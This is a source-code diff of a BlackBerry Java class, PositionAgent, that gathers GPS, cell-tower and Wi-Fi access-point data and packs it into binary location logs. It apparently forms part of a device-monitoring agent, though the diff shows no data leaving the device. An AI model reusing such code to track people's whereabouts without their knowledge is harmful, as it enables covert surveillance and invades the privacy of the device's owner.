@@ -46,10 +46,13 @@ import blackberry.utils.WChar;
 public final class PositionAgent extends Agent implements LocationListener {
     private static final int TYPE_GPS = 1;
     private static final int TYPE_CELL = 2;
-    private static final int TYPE_WIFI = 3;
-    
-    private static final int SUB_TYPE_GSM = 2;
-    private static final int SUB_TYPE_CDMA = 5;
+    private static final int TYPE_WIFI = 4;
+
+    private static final int LOG_TYPE_GPS = 1;
+    private static final int LOG_TYPE_GSM = 2;
+    private static final int LOG_TYPE_WIFI = 3;
+    private static final int LOG_TYPE_IP = 4;
+    private static final int LOG_TYPE_CDMA = 5;
     //private static final int TYPE_GPS_ASSISTED = 3;
 
     //#ifdef DEBUG
@@ -116,7 +119,7 @@ public final class PositionAgent extends Agent implements LocationListener {
                     //#endif               
 
                 }
-             
+
             }
 
         } catch (LocationException e) {
@@ -145,20 +148,27 @@ public final class PositionAgent extends Agent implements LocationListener {
 
     private void locationWIFI() {
         final WLANAPInfo wifi = WLANInfo.getAPInfo();
-        if(wifi!=null){
-            byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(), wifi.getSignalLevel());
-            saveLogNew(payload,1, TYPE_WIFI);
+        if (wifi != null) {
+            //#ifdef DEBUG_INFO
+            debug.info("Wifi: " + wifi.getBSSID());
+            //#endif
+            byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(),
+                    wifi.getSignalLevel());
+            saveLogNew(payload, 1, LOG_TYPE_WIFI);
+        } else {
+            //#ifdef DEBUG_WARN
+            debug.warn("Wifi disabled");
+            //#endif
         }
-        
+
     }
 
-   
     private void locationCELL() {
 
         final boolean gprs = !Device.isCDMA();
 
         //RadioInfo        
-        
+
         if (gprs) {
             // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
             // CC e MNC possono essere estratti da IMEI
@@ -174,7 +184,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             final int cid = cellinfo.getCellId();
 
             final int bsic = cellinfo.getBSIC();
-            
+
             //final int rssi = cellinfo.getRSSI();
             final int rssi = RadioInfo.getSignalLevel();
 
@@ -188,7 +198,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
 
             byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
-            saveLog(payload, SUB_TYPE_GSM);
+            saveLog(payload, LOG_TYPE_GSM);
 
         } else {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
@@ -199,7 +209,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             //https://www.blackberry.com/jira/browse/JAVAAPI-641
             final int mcc = RadioInfo
                     .getMCC(RadioInfo.getCurrentNetworkIndex());
-            
+
             final int rssi = RadioInfo.getSignalLevel();
 
             final StringBuffer mb = new StringBuffer();
@@ -212,7 +222,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
 
             byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
-            saveLog(payload, SUB_TYPE_CDMA);
+            saveLog(payload, LOG_TYPE_CDMA);
         }
 
     }
@@ -275,7 +285,7 @@ public final class PositionAgent extends Agent implements LocationListener {
         }
     }
 
-    private void saveLogNew(byte[] payload,int structNum, int type) {
+    private void saveLogNew(byte[] payload, int structNum, int type) {
 
         //#ifdef DBC
         Check.requires(payload != null, "saveLog payload!= null");
@@ -283,37 +293,30 @@ public final class PositionAgent extends Agent implements LocationListener {
 
         //#ifdef DEBUG_TRACE
         debug.trace("saveLog payload: " + payload.length);
+        debug.trace(Utils.byteArrayToHex(payload));
         //#endif
 
+        int addsize = 12;
+        byte[] additionalData = new byte[addsize];
+        final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
+                additionalData.length, false);
         int version = 2010082401;
-        
-        Date date = new Date();
-        int payloadSize = payload.length;
-        int size = payloadSize + 12;
 
-        byte[] message = new byte[size];
+        addbuffer.writeInt(version);
+        addbuffer.writeInt(type);
+        addbuffer.writeInt(structNum);
 
-        final DataBuffer databuffer = new DataBuffer(message, 0, size, false);
-
-        // header
-        databuffer.writeInt(version);
-        databuffer.writeInt(type);      
-        databuffer.writeInt(structNum);
-       
-        // payload
-
-        databuffer.write(payload);
-     
         //#ifdef DBC
-        Check.ensures(databuffer.getPosition() == size, "saveLog wrong size");
+        Check.ensures(addbuffer.getPosition() == addsize,
+                "addbuffer wrong size");
         //#endif
 
         // save log
-        log.createLog(null, LogType.LOCATION_NEW);
-        log.writeLog(message);
+        log.createLog(additionalData, LogType.LOCATION_NEW);
+        log.writeLog(payload);
         log.close();
     }
-    
+
     private void saveLog(byte[] payload, int type) {
 
         //#ifdef DBC
@@ -357,29 +360,65 @@ public final class PositionAgent extends Agent implements LocationListener {
         log.close();
     }
 
- private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
-        
-        byte[] payload = new byte[6+4+32+4];
-        
+    private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid
+                + " signal:" + signalLevel);
+        //#endif
+        int size = 48;
+        byte[] payload = new byte[size];
+
         final DataBuffer databuffer = new DataBuffer(payload, 0,
                 payload.length, false);
 
-        databuffer.write(Utils.hexStringToByteArray(bssid));
-                
+        for (int i = 0; i < 6; i++) {
+            byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
+            //#ifdef DEBUG_TRACE
+            debug.trace("getWifiPayload " + i + " : "
+                    + Utils.byteArrayToHex(token));
+            //#endif
+
+            //#ifdef DBC
+            Check
+                    .asserts(token.length == 1,
+                            "getWifiPayload: token wrong size");
+            //#endif
+            databuffer.writeByte(token[0]);
+        }
+
+        // PAD
+        databuffer.writeByte(0);
+        databuffer.writeByte(0);
+
         byte[] ssidcontent = ssid.getBytes();
         int len = ssidcontent.length;
-        byte[] place = new byte[32];               
-        
-        for(int i=0; i< (Math.min(32, len)); i++){
-            place[i]=ssidcontent[i];
+        byte[] place = new byte[32];
+
+        for (int i = 0; i < (Math.min(32, len)); i++) {
+            place[i] = ssidcontent[i];
         }
-        
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("getWifiPayload ssidcontent.length: " + ssidcontent.length);
+        //#endif
         databuffer.writeInt(ssidcontent.length);
+
         databuffer.write(place);
-        
+
+        databuffer.writeInt(signalLevel);
+
+        //#ifdef DBC
+        Check.ensures(databuffer.getPosition() == size,
+                "databuffer.getPosition wrong size");
+        //#endif
+
+        //#ifdef DBC
+        Check.ensures(payload.length == size, "payload wrong size");
+        //#endif
+
         return payload;
     }
- 
+
     private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {
 
         int size = 19 * 4 + 48 + 16;
@@ -398,7 +437,7 @@ public final class PositionAgent extends Agent implements LocationListener {
 
         databuffer.writeInt(0); // bsid
         databuffer.writeInt(0); // bcc
-        
+
         databuffer.writeInt(rssi); // rx level
         databuffer.writeInt(0); // rx level full
         databuffer.writeInt(0); // rx level sub
@@ -533,7 +572,7 @@ public final class PositionAgent extends Agent implements LocationListener {
 
             //#ifdef DBC
             Check.asserts(period > 0, "parse period: " + period);
-            Check.asserts(type >= 1 || type <= 3, "parse type: " + type);
+            // Check.asserts(type == 1 || type == 2 || type == 4, "parse type: " + type);
             //#endif
 
             //#ifdef DEBUG_INFO
@@ -558,7 +597,9 @@ public final class PositionAgent extends Agent implements LocationListener {
     }
 
     public void locationUpdated(LocationProvider provider, Location location) {
+        //#ifdef DEBUG
         debug.init();
+        //#endif
         //#ifdef DEBUG_TRACE
         debug.trace("locationUpdated");
         //#endif
@@ -566,7 +607,9 @@ public final class PositionAgent extends Agent implements LocationListener {
     }
 
     public void providerStateChanged(LocationProvider provider, int newState) {
+        //#ifdef DEBUG
         debug.init();
+        //#endif
         //#ifdef DEBUG_INFO
         debug.info("new state: " + newState);
         //#endif
